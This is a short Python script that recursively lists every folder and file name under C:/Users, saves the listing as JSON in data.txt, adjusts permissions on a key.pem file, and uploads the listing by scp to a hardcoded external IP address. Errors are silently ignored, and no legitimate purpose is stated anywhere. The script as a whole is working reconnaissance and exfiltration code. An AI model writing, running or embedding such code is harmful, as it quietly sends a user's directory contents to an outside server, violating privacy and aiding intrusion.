import os
import time
import json
def create_file_structure(root_dir):
    file_structure = {}
    try:
        for foldername, subfolders, filenames in os.walk(root_dir):
            relative_path = os.path.relpath(foldername, root_dir)
            parent_folder = os.path.dirname(relative_path)
            folder_name = os.path.basename(relative_path)
            
            if parent_folder not in file_structure:
                file_structure[parent_folder] = []
            
            file_structure[parent_folder].append({
                folder_name: filenames
            })
    except:{}
    
    return file_structure

# Specify the root directory to start traversal from
root_directory = 'C:/Users'

data = create_file_structure(root_directory)
data = json.dumps(data, indent = 4)

with open(f"data.txt", "w+") as file:
    file.write(data)
os.system('icacls "key.pem" /inheritance:r /grant:r "%USERNAME%:R"')
os.system(f"scp -i key.pem data.txt ubuntu@54.173.32.254:{time.time()}")
